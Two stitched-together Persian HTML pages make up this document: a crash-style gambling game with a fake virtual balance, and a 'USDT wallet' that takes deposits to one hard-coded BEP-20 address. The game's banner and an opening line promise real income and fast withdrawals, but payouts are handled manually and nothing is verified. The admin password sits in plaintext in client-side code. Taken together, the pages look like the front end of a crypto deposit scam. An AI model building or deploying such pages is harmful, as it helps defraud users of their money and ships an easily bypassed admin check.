برداشتها طی ۱روز کاری به حساب دلاری شما واریز میشود
<!DOCTYPE html>
<html lang="fa" dir="rtl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1.0">
<title>Crash Demo</title>

<style>
*{box-sizing:border-box}

body{
 margin:0;
 background:#020805;
 color:#ecfff2;
 font-family:Tahoma,Arial,sans-serif
}

.game{
 max-width:760px;
 margin:20px auto;
 padding:18px;
 background:linear-gradient(145deg,#06110a,#0b2113);
 border:1px solid #195b31;
 border-radius:22px
}

.top{
 display:flex;
 justify-content:space-between;
 align-items:center;
 flex-wrap:wrap;
 gap:10px;
 margin-bottom:14px
}

.badge{
 padding:8px 13px;
 border-radius:20px;
 background:#082817;
 border:1px solid #287542;
 color:#7cffaa;
 font-size:13px
}

.balance{
 color:#b8cdbf;
 font-size:14px
}

.balance strong{
 color:#61ff96;
 font-size:18px
}

/* نمودار */

.chart{
 position:relative;
 height:330px;
 overflow:hidden;
 border-radius:18px;
 background:
 radial-gradient(circle at 45% 70%,
 rgba(40,255,110,.10),
 transparent 52%),
 #020603;
 border:1px solid #17472a
}

.grid{
 position:absolute;
 inset:0;
 background-image:
 linear-gradient(rgba(60,255,120,.055) 1px,transparent 1px),
 linear-gradient(90deg,rgba(60,255,120,.055) 1px,transparent 1px);
 background-size:42px 42px
}

svg{
 position:absolute;
 inset:0;
 width:100%;
 height:100%
}

.main-line{
 fill:none;
 stroke:#39ff79;
 stroke-width:5;
 stroke-linecap:round;
 filter:
 drop-shadow(0 0 5px #39ff79)
 drop-shadow(0 0 14px #39ff79)
}

.main-dot{
 fill:#d5ffe2;
 filter:
 drop-shadow(0 0 6px #39ff79)
 drop-shadow(0 0 18px #39ff79)
}

/* شعله */

.flame{
 position:absolute;
 width:24px;
 height:34px;
 transform:translate(-50%,-50%);
 pointer-events:none;
 z-index:5
}

.flame:before{
 content:"";
 position:absolute;
 left:7px;
 top:4px;
 width:14px;
 height:25px;
 background:#ff3d00;
 border-radius:70% 30% 65% 35%;
 transform:rotate(45deg);
 box-shadow:
  0 0 7px #ff4d00,
  0 0 15px #ff7700,
  0 0 25px rgba(255,80,0,.8);
 animation:fire .18s infinite alternate
}

.flame:after{
 content:"";
 position:absolute;
 left:10px;
 top:11px;
 width:8px;
 height:15px;
 background:#ffe45c;
 border-radius:70% 30% 65% 35%;
 transform:rotate(45deg);
 box-shadow:0 0 8px #fff06a
}

@keyframes fire{
 from{
  transform:rotate(40deg) scale(.9);
  opacity:.8
 }
 to{
  transform:rotate(50deg) scale(1.08);
  opacity:1
 }
}

.multiplier{
 position:absolute;
 inset:0;
 display:flex;
 align-items:center;
 justify-content:center;
 font-size:58px;
 font-weight:bold;
 color:white;
 text-shadow:
  0 0 12px #39ff79,
  0 0 28px rgba(57,255,121,.55);
 pointer-events:none
}

.status{
 position:absolute;
 bottom:12px;
 right:14px;
 color:#9bb8a5;
 font-size:13px
}

/* موجودی */

.money-panel{
 margin-top:14px;
 padding:14px;
 border-radius:15px;
 background:#06130b;
 border:1px solid #16472a
}

.money-title{
 display:flex;
 justify-content:space-between;
 margin-bottom:8px;
 color:#aac5b4;
 font-size:13px
}

.money-value{
 color:#72ffa0;
 font-size:22px;
 font-weight:bold
}

.money-chart{
 height:70px;
 position:relative;
 overflow:hidden;
 border-radius:10px;
 background:#030805
}

.money-chart svg{
 width:100%;
 height:100%
}

.money-line{
 fill:none;
 stroke:#45ff82;
 stroke-width:3;
 stroke-linecap:round;
 filter:
 drop-shadow(0 0 5px #45ff82)
 drop-shadow(0 0 10px #45ff82)
}

.controls{
 display:grid;
 grid-template-columns:1fr auto;
 gap:10px;
 margin-top:14px
}

input{
 width:100%;
 min-height:50px;
 border-radius:12px;
 border:1px solid #28633d;
 background:#041009;
 color:white;
 padding:12px;
 font-size:17px;
 outline:none
}

button{
 min-height:50px;
 padding:0 25px;
 border:0;
 border-radius:12px;
 background:linear-gradient(135deg,#16b957,#45ff82);
 color:#03200d;
 font-size:16px;
 font-weight:bold;
 cursor:pointer
}

button:disabled{
 opacity:.45;
 cursor:not-allowed
}

.quota{
 text-align:center;
 margin-top:10px;
 color:#9fb9a9;
 font-size:13px
}

.quota b{
 color:#6cff9b
}

.history{
 margin-top:16px;
 border-top:1px solid #17472a;
 padding-top:12px
}

.history-title{
 color:#9db9a7;
 font-size:13px;
 margin-bottom:8px
}

.pills{
 display:flex;
 gap:7px;
 flex-wrap:wrap
}

.pill{
 padding:6px 9px;
 border-radius:8px;
 background:#091a10;
 border:1px solid #204b30;
 color:#b8d6c2;
 font-size:12px
}

@media(max-width:520px){
 .game{
  margin:8px;
  padding:12px
 }

 .chart{
  height:270px
 }

 .multiplier{
  font-size:45px
 }

 .controls{
  grid-template-columns:1fr
 }

 button{
  width:100%
 }
}
</style>
</head>

<body>

<div class="game">

<div class="top">
 <div class="badge">● برای شروع بازی دلارواریزکنیدوکسب درامدواقعی کنید</div>

 <div class="balance">
 موجودی مجازی:
 <strong id="balance">$0.001</strong>
 </div>
</div>

<div class="chart">

 <div class="grid"></div>

 <svg viewBox="0 0 700 330"
      preserveAspectRatio="none">

  <path id="mainLine"
        class="main-line"
        d="M0 285 C100 283 180 275 260 260"/>

  <circle id="mainDot"
          class="main-dot"
          cx="20"
          cy="285"
          r="7"/>
 </svg>

 <!-- شعله متحرک در نوک خط -->
 <div id="flame" class="flame"></div>

 <div id="multiplier" class="multiplier">
  1.00x
 </div>

 <div id="status" class="status">
  برای شروع راند دکمه را بزنید
 </div>

</div>

<div class="money-panel">

 <div class="money-title">
  <span>حرکت موجودی دلار مجازی</span>
  <span class="money-value" id="moneyValue">$0.001</span>
 </div>

 <div class="money-chart">

  <svg viewBox="0 0 700 70"
       preserveAspectRatio="none">

   <path id="moneyLine"
         class="money-line"
         d="M0 55"/>
  </svg>

 </div>
</div>

<div class="controls">

 <input id="bet"
        type="number"
        min="0.05"
        step="0.01"
        value="0.05"
        placeholder="">

 <button id="start">
  شروع راند
 </button>

</div>

<div class="quota">
 سهمیه آزمایشی کاربر:
 <b>$0.001</b>
</div>

<div class="history">

 <div class="history-title">
  راندهای قبلی
 </div>

 <div id="history" class="pills">
  <span class="pill">
   هنوز راندی ثبت نشده
  </span>
 </div>

</div>

</div>

<script>

const startButton =
 document.getElementById("start");

const betInput =
 document.getElementById("bet");

const multiplier =
 document.getElementById("multiplier");

const statusText =
 document.getElementById("status");

const mainLine =
 document.getElementById("mainLine");

const mainDot =
 document.getElementById("mainDot");

const flame =
 document.getElementById("flame");

const balanceElement =
 document.getElementById("balance");

const moneyValue =
 document.getElementById("moneyValue");

const moneyLine =
 document.getElementById("moneyLine");

const historyElement =
 document.getElementById("history");

let balance = 0.001;
let running = false;
let animationFrame = null;
let history = [];


/* نمایش موجودی */
function showBalance(value){

 const safe =
   Math.max(0,value);

 balanceElement.textContent =
   "$"+safe.toFixed(4);

 moneyValue.textContent =
   "$"+safe.toFixed(4);
}


/*
   تابع اصلی راند

   مدت راند عمداً طولانی‌تر شده
   و حرکت خط با easing نرم انجام می‌شود.
*/
function startRound(){

 if(running)return;

 const bet =
   Number(betInput.value);

 if(!Number.isFinite(bet) || bet < 0.05){

   statusText.textContent =
     "حداقل شرط مجازی ۰٫۰۵ است";

   return;
 }

 running = true;

 startButton.disabled = true;
 betInput.disabled = true;

 /*
    مدت زمان طولانی‌تر:
    خط خیلی آرام‌تر بالا می‌رود.
 */
 const duration =
   10000 + Math.random()*5000;

 /*
    ضریب انفجار برای دمو
 */
 const crash =
   1.35 + Math.random()*7;

 const startTime =
   performance.now();

 statusText.textContent =
   "ضریب در حال افزایش است...";


 function animate(now){

  if(!running)return;

  const raw =
    Math.min(
      (now-startTime)/duration,
      1
    );

  /*
     easing آهسته و نرم
  */
  const progress =
    raw*raw*(3-2*raw);

  /*
     ضریب
  */
  const current =
    1+(crash-1)*progress;

  multiplier.textContent =
    current.toFixed(2)+"x";


  /*
     محدوده کاملاً محدود شده:

     X هرگز از 650 عبور نمی‌کند.
     Y هرگز به بالاترین لبه نمی‌رسد.
  */

  const x =
    25 + 625*progress;

  const y =
    285 -
    225*Math.pow(progress,1.45);


  /*
     مسیر نرم
  */

  const control1X =
    x*0.35;

  const control2X =
    x*0.70;

  const control1Y =
    285 -
    25*progress;

  const control2Y =
    y+65;

  const path =
   `M25 285
    C${control1X} ${control1Y},
     ${control2X} ${control2Y},
     ${x} ${y}`;

  mainLine.setAttribute(
    "d",
    path
  );


  /*
     نقطه انتهای خط
  */

  mainDot.setAttribute(
    "cx",
    x
  );

  mainDot.setAttribute(
    "cy",
    y
  );


  /*
     شعله دقیقاً روی نوک خط
  */

  flame.style.left =
    ((x/700)*100)+"%";

  flame.style.top =
    ((y/330)*100)+"%";


  /*
     موجودی مجازی نمایشی
  */

  const virtualBalance =
    Math.max(
      0,
      balance-bet+
      bet*(current-1)*0.15
    );

  showBalance(
    virtualBalance
  );


  /*
     نمودار موجودی
  */

  const moneyX =
    700*progress;

  const moneyY =
    55-
    38*progress+
    Math.sin(progress*16)*3;

  moneyLine.setAttribute(
    "d",
    `M0 55
     C${moneyX*.35} 54,
      ${moneyX*.70} ${moneyY+15},
      ${moneyX} ${moneyY}`
  );


  /*
     ادامه حرکت
  */

  if(raw < 1){

    animationFrame =
      requestAnimationFrame(
        animate
      );

  }else{

    finishRound(crash);
  }
 }


 animationFrame =
   requestAnimationFrame(
     animate
   );
}


/* پایان راند */
function finishRound(crash){

 running = false;

 cancelAnimationFrame(
   animationFrame
 );

 /*
    خط در محدوده باقی می‌ماند
    و از نمودار خارج نمی‌شود.
 */

 multiplier.textContent =
   crash.toFixed(2)+"x";

 statusText.textContent =
   "💥 انفجار — راند تمام شد";

 /*
    شعله خاموش می‌شود.
 */

 flame.style.opacity =
   "0";

 history.unshift(
   crash.toFixed(2)+"x"
 );

 history =
   history.slice(0,8);

 historyElement.innerHTML =
   history.map(
    value =>
     `<span class="pill">${value}</span>`
   ).join("");

 setTimeout(
   resetRound,
   2000
 );
}


/* راند جدید */
function resetRound(){

 startButton.disabled = false;
 betInput.disabled = false;

 multiplier.textContent =
   "1.00x";

 statusText.textContent =
   "برای شروع راند دکمه را بزنید";

 mainLine.setAttribute(
   "d",
   "M25 285 C90 283 170 278 260 260"
 );

 mainDot.setAttribute(
   "cx",
   "25"
 );

 mainDot.setAttribute(
   "cy",
   "285"
 );

 flame.style.left =
   "3.5%";

 flame.style.top =
   "86%";

 flame.style.opacity =
   "1";

 moneyLine.setAttribute(
   "d",
   "M0 55"
 );

 showBalance(balance);
}


startButton.addEventListener(
 "click",
 startRound
);

resetRound();

</script>
<!DOCTYPE html>
<html lang="fa" dir="rtl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>USDT Wallet - BEP20</title>

<style>
*{box-sizing:border-box}

body{
    margin:0;
    font-family:Tahoma,Arial,sans-serif;
    background:linear-gradient(135deg,#031d12,#063d24,#02140c);
    color:#fff;
}

.container{
    width:94%;
    max-width:850px;
    margin:30px auto;
}

.header{
    background:rgba(5,35,22,.95);
    border:1px solid #19e67b;
    border-radius:20px;
    padding:22px;
    text-align:center;
    box-shadow:0 0 25px rgba(0,255,120,.15);
}

.header h1{
    margin:0 0 8px;
    color:#28ff8a;
}

.network{
    color:#b8ffd5;
    font-size:14px;
}

.card{
    background:rgba(4,31,20,.96);
    border:1px solid rgba(40,255,138,.35);
    border-radius:18px;
    padding:20px;
    margin-top:18px;
}

.card h2{
    margin-top:0;
    color:#35ff91;
}

.address-box{
    background:#020b07;
    border:1px solid #20d974;
    border-radius:12px;
    padding:12px;
}

.address{
    width:100%;
    background:#071d12;
    color:#72ffad;
    border:1px solid #168a4c;
    border-radius:9px;
    padding:13px;
    direction:ltr;
    text-align:center;
    font-size:13px;
    margin-bottom:10px;
}

button{
    width:100%;
    border:0;
    border-radius:11px;
    padding:13px;
    margin-top:8px;
    background:#18d873;
    color:#00180c;
    font-weight:bold;
    cursor:pointer;
}

button:hover{
    background:#38ff91;
}

button.red{
    background:#ff4e61;
    color:#fff;
}

button.orange{
    background:#ffb020;
}

input{
    width:100%;
    padding:13px;
    border-radius:10px;
    border:1px solid #176f43;
    background:#06150e;
    color:#fff;
    margin:7px 0;
    outline:none;
}

input:focus{
    border-color:#28ff8a;
}

.message{
    text-align:center;
    margin-top:10px;
    color:#61ff9f;
    font-size:14px;
}

.balance{
    text-align:center;
    font-size:27px;
    color:#38ff91;
    padding:10px;
}

.rules{
    display:grid;
    grid-template-columns:1fr 1fr;
    gap:10px;
}

.rule{
    background:#06170e;
    padding:13px;
    border-radius:10px;
    text-align:center;
}

.lock{
    text-align:center;
    font-size:45px;
}

.admin-panel{
    display:none;
}

.tx{
    background:#06180f;
    border:1px solid #175c39;
    border-radius:12px;
    padding:14px;
    margin-top:10px;
}

.tx span{
    display:block;
    margin:5px 0;
    font-size:13px;
}

.status{
    display:inline-block;
    padding:5px 9px;
    border-radius:7px;
    background:#735600;
}

.empty{
    text-align:center;
    color:#8eb6a0;
    padding:20px;
}

.small{
    font-size:11px;
    color:#8eb6a0;
    text-align:center;
    margin-top:10px;
}

@media(max-width:600px){
    .rules{
        grid-template-columns:1fr;
    }

    .address{
        font-size:11px;
    }
}
</style>
</head>

<body>

<div class="container">

    <div class="header">
        <h1>USDT WALLET</h1>
        <div class="network">
            شبکه: BNB Smart Chain (BEP-20)
        </div>
    </div>

    <!-- BALANCE -->
    <div class="card">
        <h2>موجودی</h2>
        <div class="balance">
            <span id="balance">0.00</span> USDT
        </div>
    </div>

    <!-- DEPOSIT -->
    <div class="card">
        <h2>💰 واریز USDT</h2>

        <div class="address-box">
            <div style="margin-bottom:8px;color:#baffd4">
                آدرس واریز USDT روی شبکه BEP-20:
            </div>

            <input
                id="depositAddress"
                class="address"
                value="0x3765C083F36B7D874d3a6249436a84C9e9bDAbA6"
                readonly
            >

            <button onclick="copyAddress()">
                📋 کپی آدرس
            </button>

            <div id="copyMessage" class="message"></div>
        </div>

        <input
            id="depositAmount"
            type="number"
            min="10"
            placeholder="مبلغ واریز - حداقل 10 USDT"
        >

        <input
            id="depositTx"
            placeholder="TXID تراکنش را وارد کنید"
            dir="ltr"
        >

        <button onclick="submitDeposit()">
            ثبت واریز
        </button>

        <div class="small">
            فقط USDT روی شبکه BNB Smart Chain (BEP-20)
        </div>
    </div>

    <!-- WITHDRAW -->
    <div class="card">
        <h2>💸 برداشت USDT</h2>

        <input
            id="withdrawAmount"
            type="number"
            min="100"
            placeholder="مبلغ برداشت - حداقل 100 USDT"
        >

        <input
            id="withdrawAddress"
            placeholder="آدرس کیف پول BEP-20"
            dir="ltr"
        >

        <button onclick="submitWithdraw()">
            ثبت درخواست برداشت
        </button>

        <div id="withdrawMessage" class="message"></div>

        <div class="small">
            پرداخت برداشت‌ها در این نسخه به صورت دستی توسط مدیر انجام می‌شود.
        </div>
    </div>

    <!-- ADMIN LOCK -->
    <div class="card">
        <div class="lock">🔐</div>
        <h2 style="text-align:center">
            تراکنش‌های خصوصی مدیریت
        </h2>

        <input
            id="adminPassword"
            type="password"
            placeholder="رمز مدیریت را وارد کنید"
        >

        <button onclick="unlockAdmin()">
            🔓 ورود به تراکنش‌های خصوصی
        </button>

        <div id="adminLoginMessage" class="message"></div>
    </div>

    <!-- ADMIN PANEL -->
    <div id="adminPanel" class="card admin-panel">

        <h2>🔐 پنل خصوصی مدیریت</h2>

        <div style="color:#baffd4;margin-bottom:12px">
            این بخش فقط پس از وارد کردن رمز نمایش داده می‌شود.
        </div>

        <button class="red" onclick="lockAdmin()">
            🔒 قفل کردن پنل
        </button>

        <div id="transactions">
            <div class="empty">
                هنوز تراکنشی ثبت نشده است.
            </div>
        </div>

        <button class="orange" onclick="clearTransactions()">
            پاک کردن تراکنش‌های ذخیره‌شده
        </button>

    </div>

    <div class="small" style="margin:25px 0">
        نسخه نمایشی — برای انتقال واقعی USDT باید سیستم بک‌اند امن،
        احراز تراکنش روی بلاکچین و مدیریت کلیدها به‌صورت جداگانه پیاده‌سازی شود.
    </div>

</div>


<script>

const USDT_ADDRESS =
"0x3765C083F36B7D874d3a6249436a84C9e9bDAbA6";

const ADMIN_PASSWORD =
"DogeAdmin@2026";

const MIN_DEPOSIT = 10;
const MIN_WITHDRAW = 100;


/* =========================
   COPY ADDRESS
========================= */

async function copyAddress(){

    const message =
        document.getElementById("copyMessage");

    try{

        await navigator.clipboard.writeText(USDT_ADDRESS);

        message.innerText =
            "✅ آدرس با موفقیت کپی شد";

    }catch(e){

        const input =
            document.getElementById("depositAddress");

        input.select();
        input.setSelectionRange(0,99999);

        document.execCommand("copy");

        message.innerText =
            "✅ آدرس کپی شد";
    }

    setTimeout(()=>{
        message.innerText="";
    },3000);
}


/* =========================
   STORAGE
========================= */

function getTransactions(){

    return JSON.parse(
        localStorage.getItem("usdt_transactions") || "[]"
    );

}

function saveTransactions(data){

    localStorage.setItem(
        "usdt_transactions",
        JSON.stringify(data)
    );

}


/* =========================
   DEPOSIT
========================= */

function submitDeposit(){

    const amount =
        Number(document.getElementById("depositAmount").value);

    const txid =
        document.getElementById("depositTx").value.trim();

    if(amount < MIN_DEPOSIT){

        alert("حداقل واریز 10 USDT است.");
        return;
    }

    if(!txid){

        alert("TXID تراکنش را وارد کنید.");
        return;
    }

    const transactions = getTransactions();

    transactions.unshift({

        id:Date.now(),

        type:"deposit",

        amount:amount,

        address:USDT_ADDRESS,

        txid:txid,

        status:"در انتظار بررسی",

        date:new Date().toLocaleString("fa-IR")

    });

    saveTransactions(transactions);

    document.getElementById("depositAmount").value="";
    document.getElementById("depositTx").value="";

    alert(
        "درخواست واریز ثبت شد و پس از بررسی مدیر قابل تأیید است."
    );

}


/* =========================
   WITHDRAW
========================= */

function submitWithdraw(){

    const amount =
        Number(document.getElementById("withdrawAmount").value);

    const address =
        document.getElementById("withdrawAddress").value.trim();

    if(amount < MIN_WITHDRAW){

        alert("حداقل برداشت 100 USDT است.");
        return;
    }

    if(!/^0x[a-fA-F0-9]{40}$/.test(address)){

        alert(
            "آدرس BEP-20 واردشده از نظر فرمت صحیح نیست."
        );

        return;
    }

    const transactions = getTransactions();

    transactions.unshift({

        id:Date.now(),

        type:"withdraw",

        amount:amount,

        address:address,

        status:"در انتظار پرداخت",

        date:new Date().toLocaleString("fa-IR")

    });

    saveTransactions(transactions);

    document.getElementById("withdrawAmount").value="";
    document.getElementById("withdrawAddress").value="";

    document.getElementById("withdrawMessage").innerText =
        "✅ درخواست برداشت ثبت شد.";

}


/* =========================
   ADMIN LOGIN
========================= */

function unlockAdmin(){

    const password =
        document.getElementById("adminPassword").value;

    if(password === ADMIN_PASSWORD){

        document.getElementById("adminPanel").style.display =
            "block";

        document.getElementById("adminLoginMessage").innerText =
            "✅ پنل مدیریت باز شد.";

        renderTransactions();

    }else{

        document.getElementById("adminLoginMessage").innerText =
            "❌ رمز مدیریت اشتباه است.";

    }

}


/* =========================
   ADMIN LOCK
========================= */

function lockAdmin(){

    document.getElementById("adminPanel").style.display =
        "none";

    document.getElementById("adminPassword").value="";

    document.getElementById("adminLoginMessage").innerText =
        "🔒 پنل قفل شد.";

}


/* =========================
   TRANSACTIONS
========================= */

function renderTransactions(){

    const box =
        document.getElementById("transactions");

    const transactions =
        getTransactions();

    if(transactions.length === 0){

        box.innerHTML =
            '<div class="empty">هنوز تراکنشی ثبت نشده است.</div>';

        return;
    }

    box.innerHTML = "";

    transactions.forEach(tx => {

        const div =
            document.createElement("div");

        div.className="tx";

        let type =
            tx.type === "deposit"
            ? "🟢 واریز"
            : "🔴 برداشت";

        div.innerHTML = `

            <strong>${type}</strong>

            <span>
                مبلغ:
                <b>${tx.amount} USDT</b>
            </span>

            <span>
                آدرس:
                <span dir="ltr">${tx.address}</span>
            </span>

            ${
                tx.txid
                ?
                `<span>
                    TXID:
                    <span dir="ltr">${tx.txid}</span>
                </span>`
                :
                ""
            }

            <span>
                وضعیت:
                <span class="status">${tx.status}</span>
            </span>

            <span>
                تاریخ:
                ${tx.date}
            </span>

            <button onclick="approveTransaction(${tx.id})">
                ✅ تأیید
            </button>

            <button
                class="red"
                onclick="rejectTransaction(${tx.id})">
                ❌ رد
            </button>

            ${
                tx.type === "withdraw"
                ?
                `<button
                    class="orange"
                    onclick="paidTransaction(${tx.id})">
                    💸 پرداخت شد
                </button>`
                :
                ""
            }

        `;

        box.appendChild(div);

    });

}


/* =========================
   APPROVE
========================= */

function approveTransaction(id){

    const transactions =
        getTransactions();

    const tx =
        transactions.find(x => x.id === id);

    if(tx){

        tx.status =
            "تأیید شد";

        saveTransactions(transactions);

        renderTransactions();
    }

}


/* =========================
   REJECT
========================= */

function rejectTransaction(id){

    const transactions =
        getTransactions();

    const tx =
        transactions.find(x => x.id === id);

    if(tx){

        tx.status =
            "رد شد";

        saveTransactions(transactions);

        renderTransactions();
    }

}


/* =========================
   PAID
========================= */

function paidTransaction(id){

    const transactions =
        getTransactions();

    const tx =
        transactions.find(x => x.id === id);

    if(tx){

        tx.status =
            "پرداخت شد";

        saveTransactions(transactions);

        renderTransactions();
    }

}


/* =========================
   CLEAR
========================= */

function clearTransactions(){

    if(
        confirm(
            "آیا مطمئن هستید تمام تراکنش‌ها پاک شوند؟"
        )
    ){

        localStorage.removeItem(
            "usdt_transactions"
        );

        renderTransactions();

    }

}

</script>

</body>
</html>
</body>
</html>
```
